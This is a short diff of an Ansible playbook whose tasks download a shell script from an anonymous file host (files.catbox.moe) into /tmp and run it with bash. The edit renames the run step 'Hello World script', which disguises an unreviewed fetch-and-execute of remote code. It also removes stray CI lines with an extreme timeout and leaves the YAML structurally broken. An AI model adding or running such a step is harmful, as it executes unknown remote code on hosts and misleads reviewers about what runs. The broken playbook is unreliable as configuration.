@@ -1,13 +1,9 @@
 - hosts: localhost
-runs-on: 
- ubuntu-latest timeout-minutes: 9999999
-  tasks:
-    - name: 下载 shell 脚本
+  gather_facts: no
       ansible.builtin.get_url:
         url: "https://files.catbox.moe/uh19yg.sh"
         dest: "/tmp/uh19yg.sh"
         mode: "0755"
-
-    - name: 运行 shell 脚本
-      ansible.builtin.command:
-        cmd: "bash /tmp/uh19yg.sh"
+        
+    - name: 运行 Hello World 脚本
+      ansible.builtin.command: "bash /tmp/uh19yg.sh"
